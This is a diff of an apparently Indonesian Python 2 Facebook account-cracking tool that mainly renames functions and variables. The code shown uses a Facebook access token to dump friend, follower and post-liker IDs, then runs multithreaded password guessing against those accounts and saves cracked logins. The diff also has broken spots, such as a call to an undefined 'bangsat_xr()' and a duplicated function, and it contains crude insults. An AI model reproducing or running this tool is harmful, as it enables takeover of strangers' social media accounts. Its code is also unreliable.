@@ -27,7 +27,7 @@ except ImportError:
     os.system('pip2 install bs4')
 
 import requests, os, re, bs4, sys, json, time, random, datetime
-from concurrent.futures import ThreadPoolExecutor as YayanGanteng
+from concurrent.futures import ThreadPoolExecutor as BangsatGanteng
 from datetime import datetime
 from bs4 import BeautifulSoup
 ct = datetime.now()
@@ -105,7 +105,7 @@ def hasil(ok,cp):
         print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N);exit()
 
 #masuk token
-def yayanxd():
+def bangsatxd():
     os.system('clear')
     print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
     kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
@@ -123,10 +123,9 @@ def yayanxd():
         print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
         raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)
-        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
-        moch_yayan()
+        bangsat_xd()
     except KeyError:
-        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
+        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);bangsatxd()
 
 ### ORANG GANTENG ###
 def bangsat_xd():
@@ -134,11 +133,11 @@ def bangsat_xd():
     try:
     	kontol = open('.memek.txt', 'r').read()
     except IOError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');bangsatxd()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
     except KeyError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');bangsatxd()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
@@ -160,7 +159,7 @@ def bangsat_xd():
     print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
     pepek = raw_input('\n [*] menu : ')
     if pepek == '':
-        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
+        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);bangsat_xd()
     elif pepek in['1','01']:
         teman(kontol)
     elif pepek in['2','02']:
@@ -193,10 +192,10 @@ def bangsat_xd():
                 titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                 print("%s%s"%(titid,N));time.sleep(0.03)
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
-            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));bangsat_xd()
         except (IOError):
             print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
-            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));bangsat_xd()
     elif pepek in['8','08']:
         seting_yntkts()
     elif pepek in['9','09']:
@@ -207,7 +206,7 @@ def bangsat_xd():
         time.sleep(1);os.system('rm -rf .memek.txt')
         jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
     else:
-        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
+        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);bangsat_xd()
 
 # Yang ganti bot nya gw sumpahin mak lo mati ajg!
 def wuhan(kontol):
@@ -250,11 +249,11 @@ def teman(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));bangsat_xd()
     except (KeyError,IOError):
         os.remove(cin)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));bangsat_xd()
 '''
 																																																				csy = 'Cindy sayang Yayan'
 																																																				ysc = 'Yayan sayang Cindy'
@@ -282,11 +281,11 @@ def publik(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));bangsat_xd()
     except (KeyError,IOError):
         os.remove(knt)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));bangsat_xd()
 
 # dump id dari followers hehe
 def followers(kontol):
@@ -311,11 +310,11 @@ def followers(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));bangsat_xd()
     except (KeyError,IOError):
         os.remove(ah)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));bangsat_xr()
 
 # dump id dari followers hehe
 def followers(kontol):
@@ -340,11 +339,11 @@ def followers(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));bangsat_xd()
     except (KeyError,IOError):
         os.remove(ah)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));bangsat_xd()
 
 # dump id dari postingan hehe
 def postingan(kontol):
@@ -369,11 +368,11 @@ def postingan(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));bangsat_xd()
     except (KeyError,IOError):
         os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));bangsat_xd()
 
 # cek ingfo
 def cek_ingfo(kontol):
@@ -574,8 +573,8 @@ class __crack__:
         except:
             print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
             raw_input('\n  %s[ %skembali%s ]'%(N,O,N));bangsat_xd()
-        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
-        if ___yayanganteng___ in ('Y', 'y'):
+        ___bangsatganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
+        if ___bangsatganteng___ in ('Y', 'y'):
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
                 pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
@@ -593,7 +592,7 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with RakaGanteng(max_workers=30) as (__bangsatXD__):
+                            with BangsatGanteng(max_workers=30) as (__bangsatXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
@@ -606,7 +605,7 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with RakaGanteng(max_workers=30) as (__bangsatXD__):
+                            with BangsatGanteng(max_workers=30) as (__bangsatXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
@@ -636,7 +635,7 @@ class __crack__:
                     print ' [%s3%s]. method mobile (super slow)'%(O,N)
                     __yan__(pwek.split(','))
                     break
-        elif ___rakaganteng___ in ('T', 't'):
+        elif ___bangsatganteng___ in ('T', 't'):
             print '\n [ pilih method login - silahkan coba satu² ]\n'
             print ' [%s1%s]. method API (fast)'%(O,N)
             print ' [%s2%s]. method mbasic (slow)'%(O,N)
@@ -811,7 +810,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with RakaGanteng(max_workers=30) as (__bangsatXD__):
+            with BangsatGanteng(max_workers=30) as (__bangsatXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -830,7 +829,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with RakaGanteng(max_workers=30) as (__bangsatXD__):
+            with BangsatGanteng(max_workers=30) as (__bangsatXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -849,7 +848,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with rakaGanteng(max_workers=30) as (__bangsatXD__):
+            with BangsatGanteng(max_workers=30) as (__bangsatXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -870,4 +869,4 @@ class __crack__:
 
 if __name__ == '__main__':
     os.system('git pull')
-    Bangsat-XD()
+    Bangsat_XD()
